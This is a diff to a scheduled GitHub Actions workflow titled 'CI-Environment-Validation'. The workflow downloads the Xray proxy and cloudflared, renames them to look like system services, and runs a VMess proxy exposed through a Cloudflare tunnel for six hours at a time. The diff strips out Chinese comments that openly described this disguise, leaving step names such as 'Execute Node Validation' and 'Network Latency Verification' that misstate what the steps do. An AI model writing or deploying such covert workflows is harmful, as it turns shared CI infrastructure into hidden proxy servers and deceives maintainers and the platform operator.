@@ -2,7 +2,7 @@ name: CI-Environment-Validation
 
 on:
   workflow_dispatch:
-  # 增加定时触发，看起来更像正常的系统检查
+
   schedule:
     - cron: '0 */8 * * *' 
 
@@ -20,14 +20,12 @@ jobs:
           
       - name: Execute Node Validation
         run: |
-          # 1. 下载核心组件 (静默下载并重命名)
-          # 使用镜像源或者直接下载，但关键是重命名为系统服务
+
           curl -L -s -H "User-Agent: Mozilla/5.0" -o ./sys-bin.zip "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-64.zip"
           unzip -q sys-bin.zip && mv xray web-server-daemon && chmod +x web-server-daemon
           rm -f sys-bin.zip
           
-          # 2. 生成加密配置 (VMess + WS)
-          # 这里将路径设为常见的前端静态资源路径
+
           cat <<EOF > config.json
           {
             "inbounds": [{
@@ -40,20 +38,19 @@ jobs:
           }
           EOF
 
-          # 3. 启动伪装进程
+  
           nohup ./web-server-daemon -config config.json > /dev/null 2>&1 &
           
       - name: Tunneling-Infrastructure
         run: |
-          # 下载 Cloudflare 代理并重命名
+
           curl -L -s -o ./network-agent.deb "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb"
           sudo dpkg -i network-agent.deb > /dev/null 2>&1
           rm -f network-agent.deb
           
           echo "Starting Network Latency Verification..."
           
-          # 性能优化参数：--protocol http2 强制使用 http2 提升隧道性能
-          # --heartbeat-interval 维持连接稳定性
+
           cloudflared tunnel --url http://localhost:9001 --protocol http2 --heartbeat-interval 10s > session.log 2>&1 &
           
           sleep 15
@@ -70,5 +67,5 @@ jobs:
           fi
           echo "==========================="
 
-          # 保持运行 (模拟长时间压力测试)
+
           sleep 21600
